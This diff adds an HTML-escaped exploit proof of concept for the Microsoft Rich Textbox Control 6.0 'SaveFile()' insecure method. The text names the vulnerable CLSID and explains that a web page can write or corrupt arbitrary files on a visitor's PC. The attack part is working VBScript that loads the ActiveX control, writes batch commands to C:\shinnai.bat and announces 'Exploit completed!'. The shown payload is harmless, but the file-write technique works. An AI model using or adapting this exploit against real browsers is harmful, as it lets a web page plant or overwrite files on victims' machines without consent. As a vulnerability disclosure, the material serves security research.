@@ -1,0 +1,50 @@
+&lt;pre&gt;&lt;code&gt;&lt;span style=&quot;font: 10pt Courier New;&quot;&gt;&lt;span 
+class=&quot;general1-symbol&quot;&gt;&lt;body 
+bgcolor=&quot;#E0E0E0&quot;&gt;-----------------------------------------------------------------------------
+ &lt;b&gt;Microsoft Rich Textbox Control 6.0 (SP6) &quot;SaveFile()&quot; Insecure 
+Method&lt;/b&gt;
+ url: http://www.microsoft.com
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ &lt;b&gt;&lt;font color=&#039;red&#039;&gt;This was written for educational purpose. Use it 
+at your own risk.
+ Author will be not responsible for any damage.&lt;/font&gt;&lt;/b&gt;
+
+ &lt;b&gt;Technical details:&lt;/b&gt;
+ File: RICHTX32.OCX
+ ver.: 6.1.97.82
+
+ While this GUID &lt;b&gt;{3B7C8860-D78F-101B-B9B5-04021C009402}&lt;/b&gt; is
+ killbited, this one &lt;b&gt;&lt;font 
+color=&#039;green&#039;&gt;{B617B991-A767-4F05-99BA-AC6FCABB102E}&lt;/font&gt;&lt;/b&gt;
+
+ works fine so it is possible, using the &quot;SaveFile()&quot; method,
+ to save the content of the rich textbox on a user&#039;s pc.
+ This can be used to save, overwrite and/or corrupt arbitrary
+ files on the system.
+ 
+ It&#039;s marked as:
+ &lt;b&gt;RegKey Safe for Script: False
+ RegKey Safe for Init: False
+ Implements IObjectSafety: True
+ IPersist Safe: Safe for untrusted: caller,data
+ IPStorage Safe: Safe for untrusted: caller,data&lt;/b&gt;
+
+ Tested on Windows XP Professional SP2 all patched, with Internet 
+Explorer 7
+-----------------------------------------------------------------------------
+&lt;object classid=&#039;clsid:B617B991-A767-4F05-99BA-AC6FCABB102E&#039; id=&#039;test&#039; 
+style=&#039;width: 250px; height: 75px&#039;&gt;&lt;/object&gt;	&lt;input language=VBScript 
+onclick=tryMe() type=button value=&#039;Click here to start the test&#039;&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+  Sub tryMe
+   test.Text = &quot;@echo off&quot; &amp; vbCrLf &amp; &quot;cmd.exe /c notepad.exe&quot; &amp; vbCrLf 
+&amp; &quot;echo Hello World!&quot; &amp; vbCrLf &amp; &quot;pause&quot;
+   test.SaveFile &quot;C:\shinnai.bat&quot;, 1
+   MsgBox &quot;Exploit completed!&quot;
+ End Sub
+&lt;/script&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
